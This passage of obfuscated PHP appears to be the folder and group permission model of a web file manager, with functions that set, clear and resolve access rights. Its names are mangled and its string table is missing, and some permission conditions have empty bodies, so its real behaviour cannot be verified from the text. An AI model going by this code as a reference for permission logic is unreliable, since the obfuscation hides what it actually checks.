$Ã‰‘É¶[$èè²¶ŞŠ] : array(); } if ($ÇÛıå†ƒ) { return $×¤¼œİ®; } return $Ã‰‘É¶; } public function setAuth($¬ØøâêÜ, $»—ä±Ê³) { $‡ßÔ•Ò =& $_SERVER[³Ôà×Ó]; $“¯õÙ¢Œ = Model($‡ßÔ•Ò[1414])->sourceInfo($¬ØøâêÜ); if (!$“¯õÙ¢Œ) { return !1; } if ($“¯õÙ¢Œ[$‡ßÔ•Ò[190]] != SourceModel::TYPE_GROUP) { return !1; } $×ÂîÏÉš = 1; $¸²şÑê¿ = $“¯õÙ¢Œ[$‡ßÔ•Ò[578]]; if ($¸²şÑê¿ != $×ÂîÏÉš) { $…—“»Ñ = array($‡ßÔ•Ò[1963] => $¸²şÑê¿); $²ÇŒ‚ËÑ = Model($‡ßÔ•Ò[2057])->field($‡ßÔ•Ò[1765])->where($…—“»Ñ)->select(); $²ÇŒ‚ËÑ = array_to_keyvalue($²ÇŒ‚ËÑ, $‡ßÔ•Ò[12], $‡ßÔ•Ò[1765]); } $ÀÇ¨³®Ô = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ô¸Ùø¢ = array(); foreach ($»—ä±Ê³ as $Ş¦ñã“•) { if (!in_array($Ş¦ñã“•[$‡ßÔ•Ò[190]], $ÀÇ¨³®Ô)) { show_json(LNG($‡ßÔ•Ò[2149]), !1); } if ($¸²şÑê¿ != $×ÂîÏÉš) { if ($Ş¦ñã“•[$‡ßÔ•Ò[190]] == SourceModel::TYPE_GROUP) { } if ($Ş¦ñã“•[$‡ßÔ•Ò[578]] != 0 && !in_array($Ş¦ñã“•[$‡ßÔ•Ò[578]], $²ÇŒ‚ËÑ)) { } } if ($Ş¦ñã“•[$‡ßÔ•Ò[578]] == 0) { $Ş¦ñã“•[$‡ßÔ•Ò[190]] = SourceModel::TYPE_USER; } $Ô¸Ùø¢[] = array($‡ßÔ•Ò[193] => $¬ØøâêÜ, $‡ßÔ•Ò[190] => intval($Ş¦ñã“•[$‡ßÔ•Ò[190]]), $‡ßÔ•Ò[578] => intval($Ş¦ñã“•[$‡ßÔ•Ò[578]]), $‡ßÔ•Ò[2071] => intval($Ş¦ñã“•[$‡ßÔ•Ò[2071]]) ? intval($Ş¦ñã“•[$‡ßÔ•Ò[2071]]) : 0, $‡ßÔ•Ò[2131] => intval($Ş¦ñã“•[$‡ßÔ•Ò[2131]]) ? intval($Ş¦ñã“•[$‡ßÔ•Ò[2131]]) : -1); } $this->where(array($‡ßÔ•Ò[500] => $¬ØøâêÜ))->delete(); $this->addAll($Ô¸Ùø¢); return !0; } public function authClear($ºÎá) { $ÌÚäıÕï =& $_SERVER[³Ôà×Ó]; $¡ıÂúœÃ = Model($ÌÚäıÕï[1414])->sourceInfo($ºÎá); $ÔøÚÉ’â = array($ºÎá); if ($¡ıÂúœÃ[$ÌÚäıÕï[494]] == $ÌÚäıÕï[91]) { $¯–ŒÜãä = array($ÌÚäıÕï[661] => array($ÌÚäıÕï[621], $¡ıÂúœÃ[$ÌÚäıÕï[593]] . $ºÎá . $ÌÚäıÕï[622])); $ÔøÚÉ’â = Model($ÌÚäıÕï[1414])->field($ÌÚäıÕï[500])->where($¯–ŒÜãä)->getField($ÌÚäıÕï[193], !0); $ÔøÚÉ’â[] = $ºÎá; } $this->where(array($ÌÚäıÕï[500] => array($ÌÚäıÕï[501], $ÔøÚÉ’â)))->delete(); return !0; } public function getAllChildren($Óµ©Àèó) { $ÂÇ¥Šëí =& $_SERVER[³Ôà×Ó]; $²Õ§¾İ = Model($ÂÇ¥Šëí[1414])->sourceInfo($Óµ©Àèó); if ($²Õ§¾İ[$ÂÇ¥Šëí[494]] != $ÂÇ¥Šëí[91]) { return $this->sourceListAuth(array($Óµ©Àèó)); } if ($²Õ§¾İ[$ÂÇ¥Šëí[190]] != SourceModel::TYPE_GROUP) { return array(); } $°¸€ü›í = 1; $á…¿ôÕ = array($Óµ©Àèó); if ($²Õ§¾İ[$ÂÇ¥Šëí[192]] == $ÂÇ¥Šëí[228] && $²Õ§¾İ[$ÂÇ¥Šëí[578]] != $°¸€ü›í) { $á…¿ôÕ = $this->groupChidldAllRootSource($²Õ§¾İ[$ÂÇ¥Šëí[578]]); } $®••®Õ¡ = $this->field($ÂÇ¥Šëí[193])->group($ÂÇ¥Šëí[193])->select(); $®••®Õ¡ = array_to_keyvalue($®••®Õ¡, $ÂÇ¥Šëí[12], $ÂÇ¥Šëí[193]); if (!$®••®Õ¡) { return array(); } $·Û”§’ = $ÂÇ¥Šëí[2150]; $¾É¹©Àç = array($ÂÇ¥Šëí[193] => array($ÂÇ¥Šëí[7], $®••®Õ¡), $ÂÇ¥Šëí[514] => $ÂÇ¥Šëí[228]); $ß¸µâ¸Ã = Model($ÂÇ¥Šëí[899])->field($·Û”§’)->where($¾É¹©Àç)->select(); $‚ÂŸ­°¸ = array($Óµ©Àèó); foreach ($ß¸µâ¸Ã as $×¤”ê½‚) { foreach ($á…¿ôÕ as $ƒ¨šÆ¸ş) { $òä…ŒÚ = $ÂÇ¥Šëí[50] . $ƒ¨šÆ¸ş . $ÂÇ¥Šëí[50]; $ËôüÄ§à = $×¤”ê½‚[$ÂÇ¥Šëí[593]] . $×¤”ê½‚[$ÂÇ¥Šëí[193]] . $ÂÇ¥Šëí[50]; if (strstr($ËôüÄ§à, $òä…ŒÚ)) { $‚ÂŸ­°¸[] = $×¤”ê½‚[$ÂÇ¥Šëí[193]]; break; } } } return $this->sourceListAuth($‚ÂŸ­°¸); } private function sourceListAuth($ÁõìÜÕ) { $ÈÉÛµÄ÷ =& $_SERVER[³Ôà×Ó]; $àÖ¬¿Æã = Model($ÈÉÛµÄ÷[1414])->sourceListInfo($ÁõìÜÕ, !0); $±ªŒ†£  = $this->sourceAuthSelect($ÁõìÜÕ); $å·™©ùƒ = array(); $¾¼™œ¸Ä = array(); foreach ($àÖ¬¿Æã as $ï‚İï€) { unset($ï‚İï€[$ÈÉÛµÄ÷[538]]); unset($ï‚İï€[$ÈÉÛµÄ÷[536]]); unset($ï‚İï€[$ÈÉÛµÄ÷[496]]); unset($ï‚İï€[$ÈÉÛµÄ÷[90]]); $ËıŒ¾…» = $±ªŒ†£ [$ï‚İï€[$ÈÉÛµÄ÷[193]]]; if (!$ËıŒ¾…») { continue; } $ï‚İï€[$ÈÉÛµÄ÷[2151]] = $this->authTargetInfo($ËıŒ¾…»); $ï‚İï€[$ÈÉÛµÄ÷[591]] = rtrim($ï‚İï€[$ÈÉÛµÄ÷[597]], $ÈÉÛµÄ÷[8]) . $ÈÉÛµÄ÷[8] . ltrim($ï‚İï€[$ÈÉÛµÄ÷[591]], $ÈÉÛµÄ÷[8]); $å·™©ùƒ[] = $ï‚İï€; $ø˜»…ç¢ = count(explode($ÈÉÛµÄ÷[8], trim($ï‚İï€[$ÈÉÛµÄ÷[591]], $ÈÉÛµÄ÷[8]))); $¾¼™œ¸Ä[] = $ø˜»…ç¢ + ($ï‚İï€[$ÈÉÛµÄ÷[33]] == $ÈÉÛµÄ÷[78] ? 0 : 1000); } array_multisort($¾¼™œ¸Ä, SORT_ASC, $å·™©ùƒ); return $å·™©ùƒ; } private function groupChidldAllRootSource($Ú®ÁÍ¨Ú) { $ë¡¨™¼õ =& $_SERVER[³Ôà×Ó]; $şôÏ™ö— = Model($ë¡¨™¼õ[2152])->groupChildrenAll($Ú®ÁÍ¨Ú); $„ãƒ©»¯ = array($ë¡¨™¼õ[192] => 0, $ë¡¨™¼õ[578] => array($ë¡¨™¼õ[7], $şôÏ™ö—), $ë¡¨™¼õ[190] => SourceModel::TYPE_GROUP); $¯å™Âƒ• = Model($ë¡¨™¼õ[899])->field($ë¡¨™¼õ[193])->where($„ãƒ©»¯)->select(); $¯å™Âƒ• = array_to_keyvalue($¯å™Âƒ•, $ë¡¨™¼õ[12], $ë¡¨™¼õ[193]); return $¯å™Âƒ•; } private function authTargetInfo($ÇÓ¥«­ó) { $êß•àˆ =& $_SERVER[³Ôà×Ó]; $¨’Ë°Ú¨ = array(); $ª¹’ùÔÙ = array(); $£äŠ­ü = 2 << 25; foreach ($ÇÓ¥«­ó as $Ûè‰ÙûÛ) { $ùùºÆŒÓ = Model($êß•àˆ[580])->listData($Ûè‰ÙûÛ[$êß•àˆ[2071]]); if (!$ùùºÆŒÓ) { continue; } if ($Ûè‰ÙûÛ[$êß•àˆ[190]] == SourceModel::TYPE_USER) { $¸³¯ùÃ· = Model($êß•àˆ[586])->getInfoSimpleOuter($Ûè‰ÙûÛ[$êß•àˆ[578]]); if ($¸³¯ùÃ·[$êß•àˆ[1765]] == $êß•àˆ[1270]) { continue; } if ($¸³¯ùÃ·[$êß•àˆ[1765]] == $êß•àˆ[228]) { $¸³¯ùÃ·[$êß•àˆ[32]] = LNG($êß•àˆ[2153]); } } else { $¸³¯ùÃ· = Model($êß•àˆ[594])->getInfoSimple($Ûè‰ÙûÛ[$êß•àˆ[578]]); } if (!$¸³¯ùÃ·) { continue; } $¸³¯ùÃ·[$êß•àˆ[549]] = $ùùºÆŒÓ; $¨’Ë°Ú¨[] = $¸³¯ùÃ·; $½ûõÂ¡ = 0; if ($Ûè‰ÙûÛ[$êß•àˆ[190]] == SourceModel::TYPE_GROUP) { $½ûõÂ¡ = $£äŠ­ü * 2; } if ($Ûè‰ÙûÛ[$êß•àˆ[190]] == SourceModel::TYPE_USER) { $½ûõÂ¡ = $£äŠ­ü; } if ($Ûè‰ÙûÛ[$êß•àˆ[190]] == SourceModel::TYPE_USER && $Ûè‰ÙûÛ[$êß•àˆ[578]] == $êß•àˆ[228]) { $½ûõÂ¡ = 0; } $ª¹’ùÔÙ[] = $ùùºÆŒÓ[$êß•àˆ[496]] + $½ûõÂ¡; } array_multisort($ª¹’ùÔÙ, SORT_DESC, $¨’Ë°Ú¨); return $¨’Ë°Ú¨; } public function getAllChildrenByUser($»…¬ºÊ¾, $óïüÀà§) { $Ô—óÑ =& $_SERVER[³Ôà×Ó]; $Ù÷„èœ = Model($Ô—óÑ[607])->getInfo($óïüÀà§); if (!$óïüÀà§ || !$»…¬ºÊ¾ || !$Ù÷„èœ) { return array(); } $ã“¿‚¼ò = Model($Ô—óÑ[1414])->sourceInfo($»…¬ºÊ¾); $â±›®„Ì = array(); $ÇÇÀÆÔğ = 1; if ($ã“¿‚¼ò[$Ô—óÑ[192]] == $Ô—óÑ[228] && $ã“¿‚¼ò[$Ô—óÑ[578]] != $ÇÇÀÆÔğ && $this->groupContainUser($ã“¿‚¼ò[$Ô—óÑ[578]], $óïüÀà§)) { foreach ($Ù÷„èœ[$Ô—óÑ[2154]] as $Œ„Ú§) { $óµ‰ì¡‚ = Model($Ô—óÑ[594])->getInfo($Œ„Ú§[$Ô—óÑ[1963]]); $Œ è´ó¨ = Model($Ô—óÑ[607])->getInfoSimpleOuter($óïüÀà§); $Œ è´ó¨[$Ô—óÑ[549]] = $Œ„Ú§[$Ô—óÑ[496]]; if (Model($Ô—óÑ[580])->authCheckAction($Œ„Ú§[$Ô—óÑ[496]][$Ô—óÑ[496]], $Ô—óÑ[1984])) { continue; } $ş™ğ = array($Ô—óÑ[32] => $Ô—óÑ[1290] . $óµ‰ì¡‚[$Ô—óÑ[32]], $Ô—óÑ[193] => $óµ‰ì¡‚[$Ô—óÑ[90]][$Ô—óÑ[193]], $Ô—óÑ[87] => KodIO::make($óµ‰ì¡‚[$Ô—óÑ[90]][$Ô—óÑ[193]]), $Ô—óÑ[192] => $Ô—óÑ[228], $Ô—óÑ[190] => $Ô—óÑ[587], $Ô—óÑ[33] => $Ô—óÑ[625], $Ô—óÑ[591] => $óµ‰ì¡‚[$Ô—óÑ[598]], $Ô—óÑ[1963] => $óµ‰ì¡‚[$Ô—óÑ[1963]], $Ô—óÑ[595] => $óµ‰ì¡‚[$Ô—óÑ[192]], $Ô—óÑ[2151] => array($Œ è´ó¨)); $â±›®„Ì[$ş™ğ[$Ô—óÑ[193]]] = $ş™ğ; } } $»ÕÆÛåï = array(); $î¥Á™­ = $this->getAllChildren($»…¬ºÊ¾); foreach ($î¥Á™­ as $ƒ¿ê´—) { $Åõƒ˜¦ş = !1; foreach ($ƒ¿ê´—[$Ô—óÑ[2151]] as $°¢·³§Í) { if ($°¢·³§Í[$Ô—óÑ[1765]]) { if ($°¢·³§Í[$Ô—óÑ[1765]] == $óïüÀà§) { $Åõƒ˜¦ş = !0; break; } } if ($°¢·³§Í[$Ô—óÑ[1963]]) { if ($this->groupContainUser($°¢·³§Í[$Ô—óÑ[1963]], $óïüÀà§)) { $Åõƒ˜¦ş = !0; break; } } } if ($Åõƒ˜¦ş) { $»ÕÆÛåï[] = $ƒ¿ê´—; } $›ª‰Ñû± = $ƒ¿ê´—[$Ô—óÑ[193]]; if (isset($â±›®„Ì[$›ª‰Ñû±])) { $ƒ¿ê´—[$Ô—óÑ[2151]][] = $â±›®„Ì[$›ª‰Ñû±][0]; $â±›®„Ì[$›ª‰Ñû±] = !1; } } $â±›®„Ì = array_filter(array_values($â±›®„Ì)); $»ÕÆÛåï = array_merge($â±›®„Ì, $»ÕÆÛåï); return $»ÕÆÛåï; } public function setAllChildrenByUser($…â™èš§, $ÄªÌ×ü˜, $Øˆ›™…Ç) { $¥ëÊ¢Å =& $_SERVER[³Ôà×Ó]; $•öĞ¾ïğ = $this->getAllChildrenByUser($…â™èš§, $ÄªÌ×ü˜); if (!$Øˆ›™…Ç || !$•öĞ¾ïğ) { return !1; } foreach ($•öĞ¾ïğ as $Â£Ê ³Ñ) { $®Ó©û³ê = array(); foreach ($Â£Ê ³Ñ[$¥ëÊ¢Å[2151]] as $ÚæıÛ÷›) { $ˆœÑëå = $ÚæıÛ÷›[$¥ëÊ¢Å[549]]; $¨Ò«¥®Î = $ÚæıÛ÷›[$¥ëÊ¢Å[1765]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ïĞîÀ¼È = $ÚæıÛ÷›[$¥ëÊ¢Å[1765]] ? $ÚæıÛ÷›[$¥ëÊ¢Å[1765]] : $ÚæıÛ÷›[$¥ëÊ¢Å[1963]]; if ($ÚæıÛ÷›[$¥ëÊ¢Å[1765]] && $ÚæıÛ÷›[$¥ëÊ¢Å[1765]] == $ÄªÌ×ü˜) { continue; } $®Ó©û³ê[] = array($¥ëÊ¢Å[193] => $Â£Ê ³Ñ[$¥ëÊ¢Å[193]], $¥ëÊ¢Å[190] => $¨Ò«¥®Î, $¥ëÊ¢Å[578] => intval($ïĞîÀ¼È), $¥ëÊ¢Å[2071] => isset($ˆœÑëå[$¥ëÊ¢Å[484]]) ? intval($ˆœÑëå[$¥ëÊ¢Å[484]]) : 0, $¥ëÊ¢Å[2131] => isset($ˆœÑëå[$¥ëÊ¢Å[2131]]) ? intval($ˆœÑëå[$¥ëÊ¢Å[2131]]) : -1); } $®Ó©û³ê[] = array($¥ëÊ¢Å[193] => $Â£Ê ³Ñ[$¥ëÊ¢Å[193]], $¥ëÊ¢Å[190] => SourceModel::TYPE_USER, $¥ëÊ¢Å[578] => intval($ÄªÌ×ü˜), $¥ëÊ¢Å[2071] => intval($Øˆ›™…Ç), $¥ëÊ¢Å[2131] => -1); $this->where(array($¥ëÊ¢Å[500] => $Â£Ê ³Ñ[$¥ëÊ¢Å[193]]))->delete(); $this->addAll($®Ó©û³ê); } return !0; } public function get($îÛ€Â§Å) { $ú«äõÍ× = $this->getSourceList(array($îÛ€Â§Å), !0); return $ú«äõÍ×[0]; } public function getSourceList($·Ÿà¸íß, $Ì»¹¹Èã = false, $¥¤Èâé = false) { $ò±†½Óá =& $_SERVER[³Ôà×Ó]; if (!$·Ÿà¸íß) { return array(); } $³Ñ„å¥ç = Model($ò±†½Óá[1414]); if (!$Ì»¹¹Èã && count($·Ÿà¸íß) == 1) { $Ì»¹¹Èã = array(); $Ì»¹¹Èã[$·Ÿà¸íß[0]] = $³Ñ„å¥ç->sourceInfo($·Ÿà¸íß[0]); } if (!$Ì»¹¹Èã) { $©ÃÉÏØ¯ = array($ò±†½Óá[500] => array($ò±†½Óá[501], $·Ÿà¸íß)); $Ì»¹¹Èã = $³Ñ„å¥ç->field($ò±†½Óá[2155])->where($©ÃÉÏØ¯)->select(); $Ì»¹¹Èã = array_to_keyvalue($Ì»¹¹Èã, $ò±†½Óá[193]); } $‡€ÖĞü¾ = $·Ÿà¸íß; foreach ($Ì»¹¹Èã as $¥øĞñ™â => $’Ì Å€) { $ù¸Á¨Ù˜ = $³Ñ„å¥ç->parentLevelArray($’Ì Å€[$ò±†½Óá[593]]); $‡€ÖĞü¾ = array_merge($‡€ÖĞü¾, array($¥øĞñ™â), array_reverse($ù¸Á¨Ù˜)); } $‡€ÖĞü¾ = array_values(array_unique($‡€ÖĞü¾)); if (!$‡€ÖĞü¾) { return array(); } $Ÿ‡·ïÇ¾ = $this->sourceAuthSelect($‡€ÖĞü¾); $›Û§êâ– = array(); foreach ($‡€ÖĞü¾ as $áõ„¯) { if (isset($Ÿ‡·ïÇ¾[$áõ„¯])) { $›Û§êâ–[$áõ„¯] = $Ÿ‡·ïÇ¾[$áõ„¯]; } } $Áè³èŒÍ = $this->userIsRoot($¥¤Èâé); $ºÙ†â  = AuthModel::authAll(); $¤¸¹Ø‹ò = array($ò±†½Óá[497] => $ºÙ†â , $ò±†½Óá[2156] => array($ò±†½Óá[502] => 0, $ò±†½Óá[1969] => $ºÙ†â , $ò±†½Óá[503] => LNG($ò±†½Óá[2157]), $ò±†½Óá[1986] => $ò±†½Óá[2158])); $¬Ğ“ö¶“ = array(); foreach ($Ì»¹¹Èã as $áõ„¯ => $¡ñ½òû) { if ($Áè³èŒÍ && $GLOBALS[$ò±†½Óá[6]][$ò±†½Óá[1982]]) { $¬Ğ“ö¶“[$áõ„¯] = $¤¸¹Ø‹ò; continue; } $¬Ğ“ö¶“[$áõ„¯] = $this->makeSourceAuth($¡ñ½òû, $›Û§êâ–, $¥¤Èâé); } return $¬Ğ“ö¶“; } public function authDeepCheck($ú£ãè§, $ï§ª¿¡¶ = false) { $Šüşî™ =& $_SERVER[³Ôà×Ó]; $ï§ª¿¡¶ = $ï§ª¿¡¶ ? $ï§ª¿¡¶ : USER_ID; $™£ÓÙ† = $this->makeAuthDeep($ï§ª¿¡¶); if (!in_array($ú£ãè§, $™£ÓÙ†[$Šüşî™[2159]])) { return !1; } $½»¤Í = array(); foreach ($™£ÓÙ†[$Šüşî™[2160]] as $ô‹çº×Õ => $¤ùØ§Èî) { if (!in_array($ú£ãè§, $¤ùØ§Èî)) { continue; } $½»¤Í[] = $ô‹çº×Õ; } if (!$½»¤Í) { return !1; } $å¦¥ò· = $½»¤Í ? $½»¤Í[0] : $ú£ãè§; return array($Šüşî™[497] => -1, $Šüşî™[549] => array($Šüşî™[502] => $Šüşî™[1270], $Šüşî™[1969] => $Šüşî™[228], $Šüşî™[503] => LNG($Šüşî™[2161]), $Šüşî™[1986] => $Šüşî™[2162]), $Šüşî™[2163] => LNG($Šüşî™[2164]), $Šüşî™[2165] => $this->sourceAuthInfo($å¦¥ò·)); } protected function makeAuthDeep($‰ÒöÁå = false) { $ûƒ½óğ =& $_SERVER[³Ôà×Ó]; static $¿àöäğ = array(); $‰ÒöÁå = $‰ÒöÁå ? $‰ÒöÁå : USER_ID; if (isset($¿àöäğ[$‰ÒöÁå])) { return $¿àöäğ[$‰ÒöÁå]; } $äŠÍ†²ı = Model($ûƒ½óğ[2166])->listData(); $ü—¨ê¥’ = array(); foreach ($äŠÍ†²ı as $‚Ã±¥ŒÂ) { if ($‚Ã±¥ŒÂ[$ûƒ½óğ[496]] == 0 && $‚Ã±¥ŒÂ[$ûƒ½óğ[1985]] == $ûƒ½óğ[91]) { $ü—¨ê¥’[] = $‚Ã±¥ŒÂ[$ûƒ½óğ[484]]; } } $¿Óè–…ä = $this->userGroupParents($‰ÒöÁå); $–ğê½‘Õ = array($ûƒ½óğ[190] => SourceModel::TYPE_USER, $ûƒ½óğ[578] => $‰ÒöÁå); if ($¿Óè–…ä) { $–ğê½‘Õ = array(array($ûƒ½óğ[190] => SourceModel::TYPE_USER, $ûƒ½óğ[578] => $‰ÒöÁå), array($ûƒ½óğ[190] => SourceModel::TYPE_GROUP, $ûƒ½óğ[578] => array($ûƒ½óğ[501], $¿Óè–…ä)), $ûƒ½óğ[1075] => $ûƒ½óğ[2065]); } $ıŞ»²µ¶ = $this->field($ûƒ½óğ[2167])->where($–ğê½‘Õ)->select(); $İ‰¢Ë‘± = array(); $»õ£ğ¤ = array_to_keyvalue_group($ıŞ»²µ¶, $ûƒ½óğ[193]); foreach ($»õ£ğ¤ as $ÑéÅ½Ûİ => $Ø¬¹€à) { $àœ“ÙÏ = $this->authArrayCheck($Ø¬¹€à, $‰ÒöÁå); if ($àœ“ÙÏ[$ûƒ½óğ[497]] > 0) { $İ‰¢Ë‘±[] = $ÑéÅ½Ûİ . $ûƒ½óğ[12]; } } if ($¿Óè–…ä) { $€—ğ‹À = Model($ûƒ½óğ[594]); foreach ($¿Óè–…ä as $ğğ·šÌ) { $­¿ï…Ü = $€—ğ‹À->getInfo($ğğ·šÌ); if (!$­¿ï…Ü || !is_array($­¿ï…Ü[$ûƒ½óğ[90]])) { continue; } $İ‰¢Ë‘±[] = $­¿ï…Ü[$ûƒ½óğ[90]][$ûƒ½óğ[193]]; } } $¨ò˜­¡Ğ = array(); $Ä¢¾¬ñ = $¿Óè–…ä; $¤¼“¥¼ = Model($ûƒ½óğ[1414]); $€—ğ‹À = Model($ûƒ½óğ[594]); $­ñ¤Ê´Ñ = array(); $ú›ß¤¡” = array(); $îò‰Ø®î = array(); $‰¡µà™Á = array(); if ($İ‰¢Ë‘±) { $ÚìŒ¾‰€ = $¤¼“¥¼->where(array($ûƒ½óğ[193] => array($ûƒ½óğ[501], $İ‰¢Ë‘±)))->select(); foreach ($ÚìŒ¾‰€ as $ÎÎ¡“°Œ) { $ìÁõ–Øš = $¤¼“¥¼->parentLevelArray($ÎÎ¡“°Œ[$ûƒ½óğ[593]]); $¨ò˜­¡Ğ = array_merge($¨ò˜­¡Ğ, $ìÁõ–Øš); $Ä¢¾¬ñ[] = $ÎÎ¡“°Œ[$ûƒ½óğ[578]]; $­ñ¤Ê´Ñ[$ÎÎ¡“°Œ[$ûƒ½óğ[193]]] = $ìÁõ–Øš; $ú›ß¤¡”[$ÎÎ¡“°Œ[$ûƒ½óğ[193]]] = $ÎÎ¡“°Œ[$ûƒ½óğ[578]]; } } $Ä¢¾¬ñ = array_values(array_unique($Ä¢¾¬ñ)); $“¿éäÂê = $Ä¢¾¬ñ; foreach ($“¿éäÂê as $ğğ·šÌ) { $­¿ï…Ü = $€—ğ‹À->getInfo($ğğ·šÌ); $ìÁõ–Øš = $¤¼“¥¼->parentLevelArray($­¿ï…Ü[$ûƒ½óğ[593]]); $Ä¢¾¬ñ = array_merge($Ä¢¾¬ñ, $ìÁõ–Øš); } $Ä¢¾¬ñ = array_values(array_unique($Ä¢¾¬ñ)); foreach ($Ä¢¾¬ñ as $ğğ·šÌ) { $­¿ï…Ü = $€—ğ‹À->getInfo($ğğ·šÌ); $¨ò˜­¡Ğ[] = $­¿ï…Ü[$ûƒ½óğ[90]][$ûƒ½óğ[193]]; $îò‰Ø®î[$ğğ·šÌ] = $­¿ï…Ü[$ûƒ½óğ[90]][$ûƒ½óğ[193]]; $‰¡µà™Á[$ğğ·šÌ] = $¤¼“¥¼->parentLevelArray($­¿ï…Ü[$ûƒ½óğ[593]]); } foreach ($­ñ¤Ê´Ñ as $Ÿ˜Š—Î => $•ÔûÎ‡) { $ÁğÓØ = $ú›ß¤¡”[$Ÿ˜Š—Î]; if (!$ÁğÓØ || !$îò‰Ø®î[$ÁğÓØ]) { continue; } $ÑŠ“ô¿ô = array(); foreach ($‰¡µà™Á[$ÁğÓØ] as $ğğ·šÌ) { $ÑŠ“ô¿ô[] = $îò‰Ø®î[$ğğ·šÌ]; } $­ñ¤Ê´Ñ[$Ÿ˜Š—Î] = array_merge($ÑŠ“ô¿ô, $•ÔûÎ‡); } $¨ò˜­¡Ğ = array_values(array_unique($¨ò˜­¡Ğ)); $€‘ØÒ˜º = array($ûƒ½óğ[2159] => $¨ò˜­¡Ğ, $ûƒ½óğ[2160] => $­ñ¤Ê´Ñ); $¿àöäğ[$‰ÒöÁå] = $€‘ØÒ˜º; return $€‘ØÒ˜º; } private function makeSourceAuth($„½œáı, $­û«­„, $Ó¾œ…íù = false) { $Œ‘‡œÎ† =& $_SERVER[³Ôà×Ó]; $ûøŠŸŸª = $Œ‘‡œÎ†[91]; $Ğçæıûì = $„½œáı[$Œ‘‡œÎ†[578]]; $Ğì×€ü = $„½œáı[$Œ‘‡œÎ†[190]] == SourceModel::TYPE_GROUP; $á½©–ó† = $Ğì×€ü ? $this->groupRootAuth($Ğçæıûì, $Ó¾œ…íù) : !1; if ($á½©–ó† && Model($Œ‘‡œÎ†[580])->authCheckAction($á½©–ó†[$Œ‘‡œÎ†[496]], $Œ‘‡œÎ†[1984])) { return $this->groupAuthInfo($á½©–ó†, $Ğçæıûì); } $¡æĞ€¸ = Model($Œ‘‡œÎ†[1414])->parentLevelArray($„½œáı[$Œ‘‡œÎ†[593]]); $¡æĞ€¸ = array_merge(array($„½œáı[$Œ‘‡œÎ†[193]]), array_reverse($¡æĞ€¸)); $×ğÃÇ°Ç = !1; foreach ($¡æĞ€¸ as $ö…ª“ø) { if (!isset($­û«­„[$ö…ª“ø])) { continue; } $‚–çàû— = $this->authMake($­û«­„[$ö…ª“ø], $Ó¾œ…íù); if ($‚–çàû—[$Œ‘‡œÎ†[549]]) { $×ğÃÇ°Ç = $‚–çàû—; break; } } if (!$Ğì×€ü) { return $×ğÃÇ°Ç; } if (!$×ğÃÇ°Ç && $á½©–ó†) { $×ğÃÇ°Ç = $this->groupAuthInfo($á½©–ó†, $Ğçæıûì); } if (!$×ğÃÇ°Ç) { $ò–î®äŞ = Model($Œ‘‡œÎ†[594])->getInfo($Ğçæıûì); $ËÆÁßªÛ = explode($Œ‘‡œÎ†[50], trim($ò–î®äŞ[$Œ‘‡œÎ†[593]], $Œ‘‡œÎ†[50])); $ËÆÁßªÛ = array_reverse($ËÆÁßªÛ); foreach ($ËÆÁßªÛ as $ğ•€ÃóÛ) { if ($ğ•€ÃóÛ == $Œ‘‡œÎ†[228] || $ğ•€ÃóÛ == $ûøŠŸŸª) { continue; } $›³ÍÊ± = $this->groupRootAuth($ğ•€ÃóÛ, $Ó¾œ…íù); if (!$›³ÍÊ±) { continue; } $×ğÃÇ°Ç = $this->groupAuthInfo($›³ÍÊ±, $ğ•€ÃóÛ); break; } } if (!$×ğÃÇ°Ç || $×ğÃÇ°Ç[$Œ‘‡œÎ†[497]] <= 0) { $Ëş½ª–‰ = $this->authDeepCheck($„½œáı[$Œ‘‡œÎ†[193]], $Ó¾œ…íù); if ($Ëş½ª–‰) { $×ğÃÇ°Ç = $Ëş½ª–‰; } } return $×ğÃÇ°Ç; } private function userIsRoot($òœ«Š«Ş = false) { $‹È½àô¥ =& $_SERVER[³Ôà×Ó]; if (!$òœ«Š«Ş && KodUser::isRoot()) { return !0; } $Ôµ„ßò = Model($‹È½àô¥[607])->getInfo($òœ«Š«Ş); $•ÈúÈşÁ = Model($‹È½àô¥[2168])->listData($Ôµ„ßò[$‹È½àô¥[2169]]); if ($•ÈúÈşÁ && $•ÈúÈşÁ[$‹È½àô¥[584]][$‹È½àô¥[2170]] == 1) { return !0; } return !1; } private function sourceAuthInfo($úá±ûÃâ) { $ØäĞƒË³ =& $_SERVER[³Ôà×Ó]; $òÑ¬ãÔ¸ = Model($ØäĞƒË³[1414]); $ğ©Şóî = $òÑ¬ãÔ¸->sourceInfo($úá±ûÃâ); if (!$ğ©Şóî) { return !1; } $òÑ¬ãÔ¸->groupPathDisplay($ğ©Şóî); $ùù»‚º‘ = array($ğ©Şóî); $ùù»‚º‘ = $òÑ¬ãÔ¸->_listAppendPath($ùù»‚º‘); $ğ©Şóî = $ùù»‚º‘[0]; $–”â¬…ø = $ğ©Şóî[$ØäĞƒË³[591]]; if (isset($ğ©Şóî[$ØäĞƒË³[599]])) { $¸µ¨Îğ« = explode($ØäĞƒË³[8], trim($ğ©Şóî[$ØäĞƒË³[591]], $ØäĞƒË³[8])); array_shift($¸µ¨Îğ«); $–”â¬…ø = $ğ©Şóî[$ØäĞƒË³[597]] . $ØäĞƒË³[2171] . implode($ØäĞƒË³[8], $¸µ¨Îğ«); } return array($ØäĞƒË³[503] => $ğ©Şóî[$ØäĞƒË³[32]], $ØäĞƒË³[87] => KodIO::make($ğ©Şóî[$ØäĞƒË³[193]]), $ØäĞƒË³[2172] => $–”â¬…ø); } private function groupAuthInfo($”·Ş¥Ë†, $·Ø‰›—Â) { $“×„¼à¹ =& $_SERVER[³Ôà×Ó]; $Í™ó‡¤Œ = Model($“×„¼à¹[594])->getInfo($·Ø‰›—Â); return array($“×„¼à¹[2173] => intval($”·Ş¥Ë†[$“×„¼à¹[496]]), $“×„¼à¹[2156] => $”·Ş¥Ë†, $“×„¼à¹[2174] => LNG($“×„¼à¹[2175]), $“×„¼à¹[2165] => array($“×„¼à¹[503] => $Í™ó‡¤Œ[$“×„¼à¹[32]], $“×„¼à¹[87] => KodIO::make($Í™ó‡¤Œ[$“×„¼à¹[90]][$“×„¼à¹[193]]), $“×„¼à¹[2172] => $Í™ó‡¤Œ[$“×„¼à¹[598]])); } protected function groupRootAuth($ƒæ÷µ­ä, $¢£ÏŞ = false) { $­ÃÎöŠ„ =& $_SERVER[³Ôà×Ó]; $¢£ÏŞ = $¢£ÏŞ ? $¢£ÏŞ : USER_ID; $¹Ù²‡…š = $¢£ÏŞ . 